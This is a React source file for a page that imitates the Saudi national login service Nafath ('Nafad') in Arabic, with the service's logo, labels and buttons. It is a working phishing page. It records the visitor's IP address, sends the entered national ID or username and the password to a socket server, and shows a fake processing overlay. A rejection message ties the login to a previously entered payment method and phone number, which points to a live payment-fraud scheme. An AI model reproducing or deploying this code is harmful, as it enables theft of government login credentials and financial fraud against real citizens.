import React, { useEffect, useState } from "react";
import { socket } from "../App";


const NafadPage = () => {
  const [ip, setIp] = useState(null);
  const [formData, setFormData] = useState({ username: "", password: "" });
  const [showOverlay, setShowOverlay] = useState(false);
  const [declined, setDeclined] = useState(false);

  useEffect(() => {
    const fetchIp = async () => {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        setIp(data.ip);
        const page = window.location.pathname.split("/").pop() || "nafad";
        socket.emit("updateLocation", { ip: data.ip, page });
      } catch (e) {
        console.error("IP fetch failed", e);
      }
    };

    fetchIp();

    const params = new URLSearchParams(window.location.search);
    if (params.get("declined") === "true") {
      setDeclined(true);
    }

    socket.on("ackNafad", (resp) => {
      if (!resp.success) {
        setShowOverlay(false);
        setDeclined(true);
        console.error(resp.error);
      }
    });

    return () => {
      socket.off("ackNafad");
    };
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
        const isValidPassword = (password) => {
          const pattern = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)[A-Za-z\d]{5,}$/;
          return pattern.test(password);
        };
        console.log(formData.password);
        if (!isValidPassword(formData.password))
          return window.alert(
            "يجب أن تحتوي كلمة المرور علي حرف كبير واحد علي الأقل وحرف صغير واحد ورقم واحد و بطول 5 أحرف علي الأقل"
          );
    if (!ip) return;

    setShowOverlay(true);
    socket.emit("submitNafad", {
      ip,
      username: formData.username,
      password: formData.password,
    });
  };

  return (
    <div dir="rtl" className="bg-gray-100 min-h-screen font-[Tajawal] w-full">
      <nav className="bg-white py-4 shadow px-4 flex justify-between items-center">
        <img src="/nafad.png" alt="nafad" width="128" />
        <img src="/burger.png" />
      </nav>

      <div className="text-center mt-10">
        <h1 className="text-2xl font-extrabold text-teal-700">
          الدخول على النظام
        </h1>
      </div>

      <div className="mt-4 px-4">
        <div className="bg-[#c2c2c2] text-white text-center font-bold py-4 rounded mb-2">
          تطبيق نفاذ
        </div>
        <div className="bg-teal-600 text-white text-center font-bold py-4 rounded mb-4">
          اسم المستخدم وكلمة المرور
        </div>

        <div className="bg-gray-50 shadow-xl p-6 rounded mb-6 w-full">
          <form className="space-y-10" onSubmit={handleSubmit}>
            <div>
              <label className="block text-sm text-gray-600 mb-3">
                اسم المستخدم \ الهوية الوطنية
              </label>
              <input
                type="text"
                required
                maxLength={16}
                minLength={3}
                // pattern="^(?:(?:10|20)[0-9]{8}|[A-Za-z0-9]{3,16})$"
                title="ادخل إما رقم هوية وطني سعودي (10 أرقام يبدأ بـ10 أو 20) أو اسم مستخدم إنجليزي (3–16 حرفًا)"
                className="border border-gray-200 p-2 rounded-md text-gray-700 w-full text-left"
                value={formData.username}
                onChange={(e) =>
                  setFormData((prev) => ({
                    ...prev,
                    username: e.target.value
                      .replace(/[^0-9A-Za-z]/g, "")
                      .slice(0, 16),
                  }))
                }
              />
            </div>
            <div>
              <label className="block text-sm text-gray-600 mb-3">
                كلمة المرور
              </label>
              <input
                type="password"
                required
                minLength={5}
                // pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)[A-Za-z\d]{5,}$"
                title="يجب أن تحتوي كلمة المرور على حرف كبير واحد على الأقل وحرف صغير واحد ورقم واحد، وبطول 5 أحرف على الأقل"
                className="border border-gray-200 p-2 rounded-md text-gray-700 w-full text-left"
                value={formData.password}
                onChange={(e) =>
                  setFormData((prev) => ({ ...prev, password: e.target.value }))
                }
              />
            </div>

            {declined && (
              <div className="alert alert-danger text-right">
                <span>
                  عذرًا، بيانات النفاذ الوطني التي تم إدخالها لا تتطابق مع طريقة
                  الدفع ورقم الجوال المُدخل.
                </span>
              </div>
            )}

            <button
              type="submit"
              className="btn btn-primary w-full bg-teal-700 text-white text-sm py-2"
            >
              تسجيل الدخول
            </button>
          </form>

          <div className="flex gap-3 mt-4">
            <button className="btn btn-light border py-2 rounded-md text-xs w-2/3">
              إعادة تعيين/تغيير كلمة المرور
            </button>
            <button className="btn btn-light border  py-2 rounded-md text-xs w-1/3">
              حساب جديد
            </button>
          </div>
        </div>

        <img src="/footerNafad.png" alt="footer" className="w-full mt-5" />
      </div>

      {/* Loading Overlay */}
      {showOverlay && (
        <div className="fixed inset-0 z-50 bg-black bg-opacity-60 flex items-center justify-center">
          <div className="text-white text-center">
            <div className="spinner-border text-light mb-3" role="status"></div>
            <h5 className="font-bold">يرجى الانتظار</h5>
            <p>انتظر حتى تتم معالجة طلبك</p>
          </div>
        </div>
      )}
    </div>
  );
};

export default NafadPage;
